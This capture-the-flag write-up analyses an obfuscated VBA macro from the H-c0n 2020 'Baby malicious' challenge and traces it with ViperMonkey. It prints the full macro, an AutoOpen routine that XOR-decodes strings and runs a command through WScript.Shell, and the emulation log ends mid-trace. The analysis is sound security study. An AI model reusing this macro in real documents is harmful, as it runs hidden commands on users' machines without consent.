## Description
* **Name:** [Baby malicious](https://ctf.h-c0n.com/challenges#Baby%20malicious)
* **Points:** 200
* **Tag:** Crypto
* **Team:** [Gh0st in th3 Cloud H3ll](https://ctf.h-c0n.com/teams/46) Note: *Thanks to Sedekt (aka E4gl3) && lilivx*

<p align="center">
<img src="hc0n2020quals-Challenge-Forensics-Baby_malicious.png"/>
</p>

## Tools
* Firefox 68.2.0esr https://www.mozilla.org/en-US/firefox/68.2.0/releasenotes/
* ViperMonkey https://github.com/decalage2/ViperMonkey
* Stego Tool Kit https://github.com/DominicBreuker/stego-toolkit
* BPStegano https://github.com/TapanSoni/BPStegano

## Writeup

Download the file called babymaldoc.vba (818195cf1dcbc0b09b4d5577e566916d) with a VBA Macros contained in Microsoft Office files. We detect obfuscate malicious VBA. The obfuscation alone can be an indication of a posible malicious intent [https://medium.com/walmartlabs/reverse-engineering-an-obfuscated-malicious-macro-3fd4d4f9c439]

```bash
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus_GRANTED# md5sum babymaldoc.vba
818195cf1dcbc0b09b4d5577e566916d  babymaldoc.vba
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus_GRANTED# file babymaldoc.vba
babymaldoc.vba: ASCII text, with very long lines
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus_GRANTED# cat babymaldoc.vba
Private Function cLuPucvBWJqtI(WFrUpnxVDIcv As Variant, eDAtkQQXcuQPFD As Variant)
Dim tKwqddqAGuydMc As String
tKwqddqAGuydMc = ""
For i = LBound(WFrUpnxVDIcv) To UBound(WFrUpnxVDIcv)
tKwqddqAGuydMc = tKwqddqAGuydMc & Chr(eDAtkQQXcuQPFD(i) Xor WFrUpnxVDIcv(i))
Next
cLuPucvBWJqtI = tKwqddqAGuydMc
End Function
Dim gNozGOKhJNOgYj As String
Sub AutoOpen()
Call MSMcnGyFZWhh
End Sub
Sub MSMcnGyFZWhh()
Set YNrFATuYZpSZAs = CreateObject(cLuPucvBWJqtI(Array((78 XOR 42),212,(44 + 183),181,26,((113 - 56) XOR ((6 - 2) + (90 - 4))),(40 + (23 - 0)),((42 - 0) XOR 126),(101 XOR (21 - 10)),((1 - 0) + 94),157,(((49 - 22) + 79) XOR (337 - 125)),((37 + 19) XOR 102)),Array((70 - 19),(65 + 70),128,((87 - 14) XOR ((125 - 60) + 77)),(122 - 7),(4 XOR (9 + (14 - 0))),((93 - 45) XOR 123),(33 + 89),((18 + (35 - 17)) XOR 25),55,(466 - 218),210,50)))
YNrFATuYZpSZAs.Run cLuPucvBWJqtI(Array(208,((75 - 25) XOR 94),149,120,(5 + 95),(137 + (114 - 13)),(70 + 13),(6 XOR (197 - 87)),(92 + 121),(25 XOR (122 + (148 - 59))),50,(343 - 164),((2 - 1) XOR (11 - 4)),((29 + (47 - 1)) XOR ((26 - 5) + 5)),(144 - 21)),Array((19 + (169 - 28)),(((0 - 0) + (3 - 1)) XOR (1 - 0)),226,(21 XOR 8),((37 - 17) + 2),(((6 - 3) + 22) XOR 132),((63 - 25) XOR (29 - 0)),(3 XOR ((6 - 1) + 9)),(200 - 15),166,((12 - 4) + 20),(151 + 63),(252 - 126),(((18 - 8) + 0) XOR 62),(169 - 78))) & _
cLuPucvBWJqtI(Array(250,(28 XOR ((74 - 34) + 40)),(1 + (7 - 3)),(65 + 150),((114 - 53) + (188 - 70)),((50 - 11) + 22),102,(71 XOR (163 + (54 - 22))),((20 + 36) XOR (88 + 15)),76,69,(27 - 8),(((14 - 2) + (9 - 2)) XOR (307 - 128)),((70 + 2) XOR 222),71),Array(215,(0 + 2),(14 XOR 100),(105 XOR ((198 - 94) + (192 - 54))),220,(18 XOR (109 - 37)),(7 + 2),164,(57 - 3),(74 - 33),61,51,(94 + (69 - 27)),190,9)) & _
cLuPucvBWJqtI(Array((250 - 121),73,(96 + (162 - 13)),(473 - 218),(106 XOR (412 - 158)),252,212,(115 + 0),(61 XOR 69),(243 - 79),(53 + (230 - 112)),(357 - 147),151,247,(246 - 59)),Array(228,62,(390 - 174),176,((92 - 42) XOR (333 - 137)),(232 - 82),(116 + 61),16,12,132,((98 - 11) + (162 - 20)),183,227,(9 + (361 - 153)),((29 + 194) XOR 51))) & _
cLuPucvBWJqtI(Array((47 - 4),(96 - 38),(((53 - 26) + 33) XOR 108),127,(105 + 47),72,32,230,(78 XOR (410 - 156)),(430 - 211),13,125,203,84,(49 + 97)),Array((26 + (68 - 16)),(75 + 13),(16 XOR 3),19,(207 XOR 62),(53 - 8),(45 + 33),(82 XOR ((28 - 11) + 175)),153,(1 XOR 244),(56 + 17),77,(289 - 101),(49 XOR 11),(76 XOR 178))) & _
cLuPucvBWJqtI(Array(170,199,((22 - 6) XOR (42 - 10)),(299 - 80),168,147,(75 + 17),240,57,(277 - 125),(244 - 83),50,(2 XOR 18),(44 + 65),((199 - 59) XOR 21)),Array((45 XOR (223 + (12 - 3))),((82 - 32) XOR (63 + 85)),(139 - 55),136,(24 XOR 196),((17 - 8) + 216),(31 XOR (18 + 24)),((33 - 6) XOR 133),94,(57 XOR (195 - 58)),((12 - 6) + 128),(65 XOR ((36 - 11) + 2)),((164 - 79) XOR 49),((38 - 15) XOR (11 + 3)),(215 XOR 62))) & _
cLuPucvBWJqtI(Array((120 - 57),140,(110 + (62 - 26)),148,(25 + (203 - 84)),(103 - 10),(89 - 25),211,69,255,(361 - 113),(13 + 49),((55 - 23) XOR (148 - 23)),(93 - 9),129),Array((67 XOR ((7 - 2) + 10)),((96 - 7) XOR (119 + 120)),189,187,(174 + 68),52,(28 + 24),(466 - 213),41,((68 - 13) + (140 - 61)),((299 - 129) + 45),(10 + (3 - 1)),(18 XOR 1),51,(298 - 104))) & _
cLuPucvBWJqtI(Array(21,247,(116 + (54 - 26)),((2 + (21 - 8)) XOR (26 - 6)),(64 - 15),((16 + 20) XOR ((164 - 78) + 15))),Array(((90 - 32) XOR 108),((46 - 10) + 163),(288 - 65),((19 + 30) XOR 13),(((5 - 0) + 5) XOR (30 - 12)),(190 - 86))), ((0 - 0) + 0)
gNozGOKhJNOgYj = cLuPucvBWJqtI(Array((0 + 7),(214 - 71),(1 + (4 - 2)),((12 + 29) XOR 16),(232 - 71),186,43,((129 - 58) XOR (90 + (59 - 14))),((52 - 16) XOR 73),((120 - 59) XOR 125),(45 + 137),(79 + (275 - 113)),(83 - 20),(25 + 17),((138 + (5 - 2)) XOR 30)),Array(69,223,((22 + (34 - 9)) XOR 127),((9 + 1) XOR (125 - 54)),(159 + 37),221,74,(72 XOR 230),(0 XOR 2),96,193,((62 - 27) XOR 187),((81 - 26) XOR (43 + 81)),(((22 - 6) + (53 - 26)) XOR 105),((93 + 26) XOR 196))) & _
cLuPucvBWJqtI(Array(((79 - 39) + 3),(140 - 70),195,196,((154 - 54) XOR (107 + (274 - 136))),43,(73 + (335 - 167)),249,(39 + (99 - 49)),(104 - 12)),Array((150 - 30),(4 + 3),(87 XOR (377 - 161)),((121 + 4) XOR (402 - 152)),217,98,(20 + (172 - 14)),177,(18 + 4),(0 + 18)))
Debug.Print gNozGOKhJNOgYj
End Sub
```
We started using [ViperMonkey](https://github.com/decalage2/ViperMonkey)  to analyze and emulate the VBA macro, also designed to desofuscating.

```bash
root@1v4n:~/CTF/hc0n2020/Forense/Baby_maliciosus# vmonkey babymaldoc.vba
 _    ___                 __  ___            __             
| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ /
|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
     /_/                                           /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: babymaldoc.vba
INFO     Starting emulation...
INFO     Emulating an Office (VBA) file. VBScript support is temporarily disabled in this version.
INFO     Reading document metadata...
WARNING  Reading in metadata failed. Trying fallback. not an OLE2 structured storage file
ERROR    Reading in file as Excel with xlrd failed. Unsupported format, or corrupt file: Expected BOF record; found 'Private '
WARNING  Converting spreadsheet to CSV...
ERROR    Cannot open CSV file. [Errno 2] No such file or directory: '/tmp/tmpO1oS2W.csv'
INFO     Saving dropped analysis artifacts in babymaldoc.vba_artifacts/
INFO     Parsing VB...
-------------------------------------------------------------------------------
VBA MACRO  
in file:  - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Private Function cLuPucvBWJqtI(WFrUpnxVDIcv As Variant, eDAtkQQXcuQPFD As Variant)
Dim tKwqddqAGuydMc As String
tKwqddqAGuydMc = ""
For i = LBound(WFrUpnxVDIcv) To UBound(WFrUpnxVDIcv)
tKwqddqAGuydMc = tKwqddqAGuydMc & Chr(eDAtkQQXcuQPFD(i) Xor WFrUpnxVDIcv(i))
Next
cLuPucvBWJqtI = tKwqddqAGuydMc
End Function
Dim gNozGOKhJNOgYj As String
Sub AutoOpen()
Call MSMcnGyFZWhh
End Sub
Sub MSMcnGyFZWhh()
Set YNrFATuYZpSZAs = CreateObject(cLuPucvBWJqtI(Array((78 XOR 42),212,(44 + 183),181,26,((113 - 56) XOR ((6 - 2) + (90 - 4))),(40 + (23 - 0)),((42 - 0) XOR 126),(101 XOR (21 - 10)),((1 - 0) + 94),157,(((49 - 22) + 79) XOR (337 - 125)),((37 + 19) XOR 102)),Array((70 - 19),(65 + 70),128,((87 - 14) XOR ((125 - 60) + 77)),(122 - 7),(4 XOR (9 + (14 - 0))),((93 - 45) XOR 123),(33 + 89),((18 + (35 - 17)) XOR 25),55,(466 - 218),210,50)))
YNrFATuYZpSZAs.Run cLuPucvBWJqtI(Array(208,((75 - 25) XOR 94),149,120,(5 + 95),(137 + (114 - 13)),(70 + 13),(6 XOR (197 - 87)),(92 + 121),(25 XOR (122 + (148 - 59))),50,(343 - 164),((2 - 1) XOR (11 - 4)),((29 + (47 - 1)) XOR ((26 - 5) + 5)),(144 - 21)),Array((19 + (169 - 28)),(((0 - 0) + (3 - 1)) XOR (1 - 0)),226,(21 XOR 8),((37 - 17) + 2),(((6 - 3) + 22) XOR 132),((63 - 25) XOR (29 - 0)),(3 XOR ((6 - 1) + 9)),(200 - 15),166,((12 - 4) + 20),(151 + 63),(252 - 126),(((18 - 8) + 0) XOR 62),(169 - 78))) & cLuPucvBWJqtI(Array(250,(28 XOR ((74 - 34) + 40)),(1 + (7 - 3)),(65 + 150),((114 - 53) + (188 - 70)),((50 - 11) + 22),102,(71 XOR (163 + (54 - 22))),((20 + 36) XOR (88 + 15)),76,69,(27 - 8),(((14 - 2) + (9 - 2)) XOR (307 - 128)),((70 + 2) XOR 222),71),Array(215,(0 + 2),(14 XOR 100),(105 XOR ((198 - 94) + (192 - 54))),220,(18 XOR (109 - 37)),(7 + 2),164,(57 - 3),(74 - 33),61,51,(94 + (69 - 27)),190,9)) & cLuPucvBWJqtI(Array((250 - 121),73,(96 + (162 - 13)),(473 - 218),(106 XOR (412 - 158)),252,212,(115 + 0),(61 XOR 69),(243 - 79),(53 + (230 - 112)),(357 - 147),151,247,(246 - 59)),Array(228,62,(390 - 174),176,((92 - 42) XOR (333 - 137)),(232 - 82),(116 + 61),16,12,132,((98 - 11) + (162 - 20)),183,227,(9 + (361 - 153)),((29 + 194) XOR 51))) & cLuPucvBWJqtI(Array((47 - 4),(96 - 38),(((53 - 26) + 33) XOR 108),127,(105 + 47),72,32,230,(78 XOR (410 - 156)),(430 - 211),13,125,203,84,(49 + 97)),Array((26 + (68 - 16)),(75 + 13),(16 XOR 3),19,(207 XOR 62),(53 - 8),(45 + 33),(82 XOR ((28 - 11) + 175)),153,(1 XOR 244),(56 + 17),77,(289 - 101),(49 XOR 11),(76 XOR 178))) & cLuPucvBWJqtI(Array(170,199,((22 - 6) XOR (42 - 10)),(299 - 80),168,147,(75 + 17),240,57,(277 - 125),(244 - 83),50,(2 XOR 18),(44 + 65),((199 - 59) XOR 21)),Array((45 XOR (223 + (12 - 3))),((82 - 32) XOR (63 + 85)),(139 - 55),136,(24 XOR 196),((17 - 8) + 216),(31 XOR (18 + 24)),((33 - 6) XOR 133),94,(57 XOR (195 - 58)),((12 - 6) + 128),(65 XOR ((36 - 11) + 2)),((164 - 79) XOR 49),((38 - 15) XOR (11 + 3)),(215 XOR 62))) & cLuPucvBWJqtI(Array((120 - 57),140,(110 + (62 - 26)),148,(25 + (203 - 84)),(103 - 10),(89 - 25),211,69,255,(361 - 113),(13 + 49),((55 - 23) XOR (148 - 23)),(93 - 9),129),Array((67 XOR ((7 - 2) + 10)),((96 - 7) XOR (119 + 120)),189,187,(174 + 68),52,(28 + 24),(466 - 213),41,((68 - 13) + (140 - 61)),((299 - 129) + 45),(10 + (3 - 1)),(18 XOR 1),51,(298 - 104))) & cLuPucvBWJqtI(Array(21,247,(116 + (54 - 26)),((2 + (21 - 8)) XOR (26 - 6)),(64 - 15),((16 + 20) XOR ((164 - 78) + 15))),Array(((90 - 32) XOR 108),((46 - 10) + 163),(288 - 65),((19 + 30) XOR 13),(((5 - 0) + 5) XOR (30 - 12)),(190 - 86))), ((0 - 0) + 0)
gNozGOKhJNOgYj = cLuPucvBWJqtI(Array((0 + 7),(214 - 71),(1 + (4 - 2)),((12 + 29) XOR 16),(232 - 71),186,43,((129 - 58) XOR (90 + (59 - 14))),((52 - 16) XOR 73),((120 - 59) XOR 125),(45 + 137),(79 + (275 - 113)),(83 - 20),(25 + 17),((138 + (5 - 2)) XOR 30)),Array(69,223,((22 + (34 - 9)) XOR 127),((9 + 1) XOR (125 - 54)),(159 + 37),221,74,(72 XOR 230),(0 XOR 2),96,193,((62 - 27) XOR 187),((81 - 26) XOR (43 + 81)),(((22 - 6) + (53 - 26)) XOR 105),((93 + 26) XOR 196))) & cLuPucvBWJqtI(Array(((79 - 39) + 3),(140 - 70),195,196,((154 - 54) XOR (107 + (274 - 136))),43,(73 + (335 - 167)),249,(39 + (99 - 49)),(104 - 12)),Array((150 - 30),(4 + 3),(87 XOR (377 - 161)),((121 + 4) XOR (402 - 152)),217,98,(20 + (172 - 14)),177,(18 + 4),(0 + 18)))
Debug.Print gNozGOKhJNOgYj
End Sub
-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO     parsed Function cLuPucvBWJqtI ([ByRef WFrUpnxVDIcv as Variant, ByRef eDAtkQQXcuQPFD as Variant]): 4 statement(s)
INFO     parsed Sub AutoOpen (): 1 statement(s)
INFO     parsed Sub MSMcnGyFZWhh (): 4 statement(s)
INFO     parsed Loose Lines Block: ([Dim gNozGOKhJNOgYj As String = NU ...): 3 statement(s)
INFO     Reading document variables...
INFO     Reading Shapes object text fields...
ERROR    Cannot read associated Shapes text. not an OLE2 structured storage file
INFO     Reading InlineShapes object text fields...
INFO     Reading TextBox object text fields...
INFO     Reading custom document properties...
ERROR    Cannot read custom doc properties. not an OLE2 structured storage file
INFO     Reading embedded object text fields...
ERROR    Cannot read tag/caption from embedded objects. not an OLE2 structured storage file
INFO     Reading document text...
INFO     Reading form variables...

-------------------------------------------------------------------------------
TRACING VBA CODE (entrypoint = Auto*):
INFO     Emulating loose statements...
INFO     Emulating Loose Lines Block: ([Dim gNozGOKhJNOgYj As String = NU ...): 3 statement(s) ...
INFO     ACTION: Found Entry Point - params 'autoopen' -
INFO     evaluating Sub AutoOpen
INFO     Calling Procedure: MSMcnGyFZWhh('[]')
INFO     evaluating Sub MSMcnGyFZWhh
INFO     calling Function: Array(100, 212, 227, 181, 26, 99, 63, 84, 110, 95, 157, 190, 94)
INFO     calling Function: Array(51, 135, 128, 199, 115, 19, 75, 122, 61, 55, 248, 210, 50)
INFO     calling Function: cLuPucvBWJqtI([100, 212, 227, 181, 26, 99, 63, 84, 110, 95, 157, 190, 94], [51, 135, 128, 199,...)
INFO     calling Function: LBound([100, 212, 227, 181, 26, 99, 63, 84, 110, 95, 157, 190, 94])
INFO     calling Function: UBound([100, 212, 227, 181, 26, 99, 63, 84, 110, 95, 157, 190, 94])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: CreateObject('WScript.Shell')
INFO     ACTION: CreateObject - params ['WScript.Shell'] - Interesting Function Call
INFO     calling Function: Array(208, 108, 149, 120, 100, 238, 83, 104, 213, 202, 50, 179, 6, 81, 123)
INFO     calling Function: Array(160, 3, 226, 29, 22, 157, 59, 13, 185, 166, 28, 214, 126, 52, 91)
INFO     calling Function: cLuPucvBWJqtI([208, 108, 149, 120, 100, 238, 83, 104, 213, 202, 50, 179, 6, 81, 123], [160, 3,...)
INFO     calling Function: LBound([208, 108, 149, 120, 100, 238, 83, 104, 213, 202, 50, 179, 6, 81, 123])
INFO     calling Function: UBound([208, 108, 149, 120, 100, 238, 83, 104, 213, 202, 50, 179, 6, 81, 123])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(250, 76, 5, 215, 179, 61, 102, 132, 95, 76, 69, 19, 160, 150, 71)
INFO     calling Function: Array(215, 2, 106, 155, 220, 90, 9, 164, 54, 41, 61, 51, 136, 190, 9)
INFO     calling Function: cLuPucvBWJqtI([250, 76, 5, 215, 179, 61, 102, 132, 95, 76, 69, 19, 160, 150, 71], [215, 2, 106...)
INFO     calling Function: LBound([250, 76, 5, 215, 179, 61, 102, 132, 95, 76, 69, 19, 160, 150, 71])
INFO     calling Function: UBound([250, 76, 5, 215, 179, 61, 102, 132, 95, 76, 69, 19, 160, 150, 71])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(129, 73, 245, 255, 148, 252, 212, 115, 120, 164, 171, 210, 151, 247, 187)
INFO     calling Function: Array(228, 62, 216, 176, 246, 150, 177, 16, 12, 132, 229, 183, 227, 217, 236)
INFO     calling Function: cLuPucvBWJqtI([129, 73, 245, 255, 148, 252, 212, 115, 120, 164, 171, 210, 151, 247, 187], [228...)
INFO     calling Function: LBound([129, 73, 245, 255, 148, 252, 212, 115, 120, 164, 171, 210, 151, 247, 187])
INFO     calling Function: UBound([129, 73, 245, 255, 148, 252, 212, 115, 120, 164, 171, 210, 151, 247, 187])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(43, 58, 80, 127, 152, 72, 32, 230, 176, 219, 13, 125, 203, 84, 146)
INFO     calling Function: Array(78, 88, 19, 19, 241, 45, 78, 146, 153, 245, 73, 77, 188, 58, 254)
INFO     calling Function: cLuPucvBWJqtI([43, 58, 80, 127, 152, 72, 32, 230, 176, 219, 13, 125, 203, 84, 146], [78, 88, 1...)
INFO     calling Function: LBound([43, 58, 80, 127, 152, 72, 32, 230, 176, 219, 13, 125, 203, 84, 146])
INFO     calling Function: UBound([43, 58, 80, 127, 152, 72, 32, 230, 176, 219, 13, 125, 203, 84, 146])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(170, 199, 48, 219, 168, 147, 92, 240, 57, 152, 161, 50, 16, 109, 153)
INFO     calling Function: Array(197, 166, 84, 136, 220, 225, 53, 158, 94, 176, 134, 90, 100, 25, 233)
INFO     calling Function: cLuPucvBWJqtI([170, 199, 48, 219, 168, 147, 92, 240, 57, 152, 161, 50, 16, 109, 153], [197, 16...)
INFO     calling Function: LBound([170, 199, 48, 219, 168, 147, 92, 240, 57, 152, 161, 50, 16, 109, 153])
INFO     calling Function: UBound([170, 199, 48, 219, 168, 147, 92, 240, 57, 152, 161, 50, 16, 109, 153])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
INFO     calling Function: WFrUpnxVDIcv(6)
INFO     calling Function: eDAtkQQXcuQPFD(7)
INFO     calling Function: WFrUpnxVDIcv(7)
INFO     calling Function: eDAtkQQXcuQPFD(8)
INFO     calling Function: WFrUpnxVDIcv(8)
INFO     calling Function: eDAtkQQXcuQPFD(9)
INFO     calling Function: WFrUpnxVDIcv(9)
INFO     calling Function: eDAtkQQXcuQPFD(10)
INFO     calling Function: WFrUpnxVDIcv(10)
INFO     calling Function: eDAtkQQXcuQPFD(11)
INFO     calling Function: WFrUpnxVDIcv(11)
INFO     calling Function: eDAtkQQXcuQPFD(12)
INFO     calling Function: WFrUpnxVDIcv(12)
INFO     calling Function: eDAtkQQXcuQPFD(13)
INFO     calling Function: WFrUpnxVDIcv(13)
INFO     calling Function: eDAtkQQXcuQPFD(14)
INFO     calling Function: WFrUpnxVDIcv(14)
INFO     calling Function: Array(63, 140, 146, 148, 144, 93, 64, 211, 69, 255, 248, 62, 93, 84, 129)
INFO     calling Function: Array(76, 182, 189, 187, 242, 52, 52, 253, 41, 134, 215, 12, 19, 51, 194)
INFO     calling Function: cLuPucvBWJqtI([63, 140, 146, 148, 144, 93, 64, 211, 69, 255, 248, 62, 93, 84, 129], [76, 182, ...)
INFO     calling Function: LBound([63, 140, 146, 148, 144, 93, 64, 211, 69, 255, 248, 62, 93, 84, 129])
INFO     calling Function: UBound([63, 140, 146, 148, 144, 93, 64, 211, 69, 255, 248, 62, 93, 84, 129])
INFO     calling Function: eDAtkQQXcuQPFD(0)
INFO     calling Function: WFrUpnxVDIcv(0)
INFO     calling Function: eDAtkQQXcuQPFD(1)
INFO     calling Function: WFrUpnxVDIcv(1)
INFO     calling Function: eDAtkQQXcuQPFD(2)
INFO     calling Function: WFrUpnxVDIcv(2)
INFO     calling Function: eDAtkQQXcuQPFD(3)
INFO     calling Function: WFrUpnxVDIcv(3)
INFO     calling Function: eDAtkQQXcuQPFD(4)
INFO     calling Function: WFrUpnxVDIcv(4)
INFO     calling Function: eDAtkQQXcuQPFD(5)
INFO     calling Function: WFrUpnxVDIcv(5)
INFO     calling Function: eDAtkQQXcuQPFD(6)
